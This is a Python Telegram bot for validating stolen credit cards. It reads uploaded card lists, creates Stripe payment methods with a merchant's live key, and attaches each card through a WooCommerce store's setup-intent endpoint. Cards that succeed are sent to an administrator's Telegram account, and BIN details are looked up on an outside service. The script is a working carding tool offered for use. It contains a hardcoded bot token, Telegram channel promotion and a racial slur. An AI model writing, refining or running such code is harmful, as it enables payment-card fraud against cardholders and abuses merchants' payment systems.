import requests
import random
import string
import re
import sys
from bs4 import BeautifulSoup
import user_agent
import os
import telebot

# "cd /storage/emulated/0/download/telegram/"
# run "pip install -r requirements.txt" before run main.py the code
# "python main.py"

bot = telebot.TeleBot('7767132129:AAGjQmc2MDpPkJYUIv3ryu0t5UTQMh0I6TU') # Replace Bot Token
admin = '7535818274' # Replace User ID
ua = user_agent.generate_user_agent()

def nonce_id():
    r = requests.session()
    headers = {
        'user-agent': ua,
    }
    response = r.get('https://sissylover.com/my-account/payment-methods/', headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-fA-F0-9]+)"', response.text)
    if match:
        return match.group(1)
    else:
        return None
        
# JOIN @STRIPEFUCKKER - @RUSSIANPELO
def get_id(cc, mm, yy, cvv):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': ua,
    }
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/fd95e0ffd9; stripe-js-v3/fd95e0ffd9; payment-element; deferred-intent',
        'referrer': 'https://sissylover.com',
        'time_on_page': '48760',
        'client_attribution_metadata[client_session_id]': 'ce8adbc5-bb80-4549-9668-1661020fbef7',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'c13855f7-15a5-4028-8920-f51341b4c44d42ae05',
        'muid': '8d42c9aa-9b82-40fd-aa49-bcd553be19cc6e1a97',
        'sid': '67acd963-9234-45bf-8c3a-86204d86d3a4188021',
        'key': 'pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP',
        '_stripe_version': '2024-06-20',
    }
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    if response.status_code == 200:
        return response.json()['id']
    else:
        print(f"Error creating payment method: {response.text}")
        return None

def final(iddd, nonce):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://sissylover.com',
        'priority': 'u=1, i',
        'referer': 'https://sissylover.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }
    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': iddd,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    response = requests.post('https://sissylover.com/', params=params, headers=headers, data=data)
    return response.text

def bin_dt(bin):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + str(bin), timeout=30).json()
        return api_url
    except:
        return None

def return_info(api):
    if not api or 'Invalid BIN' in api or 'detail' in api:
        return "**BIN Lookup Failed**"
    brand = api.get("brand", "Unknown")
    card_type = api.get("type", "Unknown")
    level = api.get("level", "Unknown")
    bank = api.get("bank", "Unknown")
    country_name = api.get("country_name", "Unknown")
    country_flag = api.get("country_flag", "")
    bin = api.get('bin', "Unknown")
    look = f"""
`Bin : {bin}`
`Info : {brand}-{card_type}-{level}`
`Bank : {bank}`
`Country : {country_name} {country_flag}`
"""
    return look

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "`Hello Nigga`\n`Send Me CC List(.txt)..!!`", parse_mode="markdown")

@bot.message_handler(content_types=['document'])
def chk_compo(message):
    finfo = bot.get_file(message.document.file_id)
    downlod = bot.download_file(finfo.file_path)
    path = os.path.join("files", message.document.file_name)
    os.makedirs("files", exist_ok=True)
    with open(path, "wb") as compo:
        compo.write(downlod)
    with open(path, encoding="utf-8") as file:
        bot.reply_to(message, 'Hold On <> Checking your combo..!!')
        for line in file:
            cc_line = line.strip()
            try:
                cc, mm, yy, cvv = cc_line.split('|')
                yy = '20' + yy if len(yy) == 2 else yy
            except ValueError:
                print(f"Invalid format: {cc_line}")
                continue
            bin_number = cc[:6]
            look = bin_dt(bin_number)
            iddd = get_id(cc, mm, yy, cvv)
            if iddd:
                nonce = nonce_id()
                if nonce:
                    response_text = final(iddd, nonce)
                    if 'succeeded' in response_text:
                        mess = f'''
`Approved ✅`

`Card : {cc_line}`
`Gateway : Stripe Auth`
`Response : Card Added Successfully`
{return_info(look)}
`BY - @WasDarkboy`'''
                        bot.send_message(admin, mess, parse_mode="markdown")
                        print(f"✅ Approved : {cc_line} - @SmexLuis")
                    else:
                        print(f"❌ Declined : {cc_line}")
                else:
                    print(f"Nonce Error : {cc_line}")
            else:
                print(f"Api Dead 🤡")

bot.infinity_polling(timeout=25)
